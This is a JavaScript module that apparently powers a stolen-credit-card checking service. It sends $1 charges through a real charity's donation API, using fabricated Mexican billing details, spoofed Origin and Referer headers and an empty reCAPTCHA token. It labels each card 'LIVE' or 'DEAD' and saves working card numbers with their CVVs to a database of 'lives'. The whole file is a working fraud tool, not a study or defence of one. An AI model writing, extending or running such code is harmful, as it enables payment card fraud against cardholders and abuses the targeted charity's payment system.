import { db } from '../config/firebase.js';
import axios from 'axios';

/**
 * Get active gates from Firestore
 */
const getActiveGates = async () => {
  try {
    const snapshot = await db.collection('gates')
      .where('status', '==', 'active')
      .get();

    return snapshot.docs.map(doc => ({
      id: doc.id,
      ...doc.data(),
    }));
  } catch (error) {
    console.error('Error getting active gates:', error);
    return [];
  }
};

/**
 * Verify card through gate
 */
export const verifyCard = async ({ cc, mm, yy, cvv, userId, userName }) => {
  try {
    // Get active gates
    const gates = await getActiveGates();

    if (gates.length === 0) {
      throw new Error('No active gates available');
    }

    // Prioritize K-LOVE gate
    let gate = gates.find(g => g.type === 'klove' || g.name?.toLowerCase().includes('klove'));

    // Fallback to random gate if K-LOVE not found
    if (!gate) {
      gate = gates[Math.floor(Math.random() * gates.length)];
    }

    // Execute gate check
    const result = await executeGateCheck(gate, { cc, mm, yy, cvv });

    // Save live to Firestore if approved
    if (result.status === 'approved' || result.status === 'live') {
      await saveLive({
        userId,
        userName,
        card: {
          number: cc,
          month: mm,
          year: yy,
          cvv,
        },
        gateId: gate.id,
        gateName: gate.name,
        gateType: gate.type,
        status: result.status,
        message: result.message,
        bank: result.bank,
        country: result.country,
        type: result.type,
        timestamp: new Date(),
      });

      // Increment gate stats
      await incrementGateStats(gate.id);
    }

    return {
      ...result,
      gateName: gate.name,
      gateType: gate.type,
    };
  } catch (error) {
    console.error('Error verifying card:', error);
    throw error;
  }
};

/**
 * Generate random Mexican billing data
 */
const generateMexicanBillingData = () => {
  const firstNames = ['Juan', 'Carlos', 'Miguel', 'José', 'Luis', 'Pedro', 'Antonio', 'Francisco'];
  const lastNames = ['García', 'Rodríguez', 'Martínez', 'Hernández', 'López', 'González', 'Pérez', 'Sánchez'];
  const streets = ['Avenida Juárez', 'Calle Juárez', 'Paseo de la Reforma', 'Avenida Insurgentes', 'Calle Madero'];
  const cities = ['Mazatlan', 'Guadalajara', 'Monterrey', 'Puebla', 'Tijuana', 'León', 'Zapopan'];
  const states = ['Sinaloa', 'Jalisco', 'Nuevo León', 'Puebla', 'Baja California', 'Guanajuato'];

  const randomNumber = () => Math.floor(Math.random() * 999) + 1;
  const randomPostalCode = () => String(Math.floor(Math.random() * 90000) + 10000);
  const randomPhone = () => '55' + String(Math.floor(Math.random() * 100000000)).padStart(8, '0');

  return {
    firstName: firstNames[Math.floor(Math.random() * firstNames.length)],
    lastName: lastNames[Math.floor(Math.random() * lastNames.length)],
    street: `${streets[Math.floor(Math.random() * streets.length)]} ${randomNumber()}`,
    city: cities[Math.floor(Math.random() * cities.length)],
    state: states[Math.floor(Math.random() * states.length)],
    postalCode: randomPostalCode(),
    phoneNumber: randomPhone(),
    email: `test${randomNumber()}@gmail.com`,
  };
};

/**
 * Execute K-LOVE gate check
 */
const executeKLoveGate = async (cardData) => {
  try {
    const billing = generateMexicanBillingData();

    const payload = {
      amount: 1,
      applePayInfo: {},
      billingType: 0,
      businessName: '',
      city: billing.city,
      country: 'MX',
      customAmount: 1,
      dedicationFirstName: '',
      dedicationLastName: '',
      draftDay: 20,
      email: billing.email,
      firstName: billing.firstName,
      frequency: 1,
      gau: 'KLGF',
      hasExistingAccount: false,
      isAch: false,
      isBusiness: false,
      isCoveringProcessingFee: false,
      isCreditCard: true,
      isDedication: false,
      isInHonorOf: false,
      isInMemoryOf: false,
      lastName: billing.lastName,
      paymentMethod: 'Credit Card',
      paymentToken: '',
      paypalInfo: {},
      phoneNumber: billing.phoneNumber,
      postalCode: billing.postalCode,
      state: billing.state,
      street: billing.street,
      creditCardInfo: {
        cardNumber: `${cardData.cc.slice(0, 4)} ${cardData.cc.slice(4, 8)} ${cardData.cc.slice(8, 12)} ${cardData.cc.slice(12)}`,
        expiration: `${cardData.mm} / ${cardData.yy}`,
        profileId: '',
      },
      recaptchaToken: '',
      tealiumVisitorId: `019b399b639d00211ecb5f4218a005075001b06d00b24`,
    };

    const response = await axios.post(
      'https://donationapi.emfmedia.com/api/transaction',
      payload,
      {
        headers: {
          'Content-Type': 'application/json',
          'Accept': 'application/json, text/plain, */*',
          'Origin': 'https://donate.klove.com',
          'Referer': 'https://donate.klove.com/es',
        },
        validateStatus: () => true, // Accept all status codes
      }
    );

    // Parse response
    if (response.status === 200) {
      // LIVE - Transaction successful
      return {
        status: 'approved',
        message: '✅ LIVE - Charged $1.00',
        bank: 'Unknown',
        country: 'MX',
        type: 'VISA',
      };
    } else if (response.status === 400) {
      // Declined or Insufficient Funds
      const errorData = response.data;
      if (Array.isArray(errorData) && errorData[0]?.value) {
        const errorMsg = errorData[0].value;

        if (errorMsg.includes('Failed to Charge Card')) {
          return {
            status: 'declined',
            message: '❌ Declined - Insufficient Funds or DEAD',
            bank: 'Unknown',
            country: 'MX',
            type: 'VISA',
          };
        }

        // Other 400 errors
        return {
          status: 'declined',
          message: '❌ ' + errorMsg,
          bank: 'Unknown',
          country: 'MX',
          type: 'VISA',
        };
      }
    } else if (response.status === 401) {
      // Unauthorized - reCAPTCHA or authentication issue
      return {
        status: 'error',
        message: '⚠️ Gate requires authentication (reCAPTCHA)',
        bank: 'Unknown',
        country: 'MX',
        type: 'VISA',
      };
    }

    // Unrecognized response
    return {
      status: 'error',
      message: `⚠️ Response no reconocido (Status: ${response.status})`,
      bank: 'Unknown',
      country: 'MX',
      type: 'VISA',
    };
  } catch (error) {
    return {
      status: 'error',
      message: '⚠️ Gate Error: ' + error.message,
      bank: 'Unknown',
      country: 'MX',
      type: 'VISA',
    };
  }
};

/**
 * Execute gate check
 */
const executeGateCheck = async (gate, cardData) => {
  // Check gate type and route to appropriate implementation
  if (gate.type === 'klove' || gate.name?.toLowerCase().includes('klove')) {
    return await executeKLoveGate(cardData);
  }

  // Fallback to mock for other gates
  await new Promise(resolve => setTimeout(resolve, 2000));
  const isApproved = Math.random() > 0.5;

  return {
    status: isApproved ? 'approved' : 'declined',
    message: isApproved ? 'Transaction approved' : 'Card declined',
    bank: 'Test Bank',
    country: 'US',
    type: 'VISA',
  };
};

/**
 * Save live card to Firestore
 */
const saveLive = async (liveData) => {
  try {
    await db.collection('lives').add(liveData);
  } catch (error) {
    console.error('Error saving live:', error);
  }
};

/**
 * Increment gate statistics
 */
const incrementGateStats = async (gateId) => {
  try {
    const gateRef = db.collection('gates').doc(gateId);
    await gateRef.update({
      totalChecks: db.FieldValue.increment(1),
      lastUsed: new Date(),
    });
  } catch (error) {
    console.error('Error incrementing gate stats:', error);
  }
};

/**
 * Get all gates (for admin)
 */
export const getAllGates = async () => {
  try {
    const snapshot = await db.collection('gates').get();
    return snapshot.docs.map(doc => ({
      id: doc.id,
      ...doc.data(),
    }));
  } catch (error) {
    console.error('Error getting all gates:', error);
    return [];
  }
};

export default {
  verifyCard,
  getActiveGates,
  getAllGates,
};
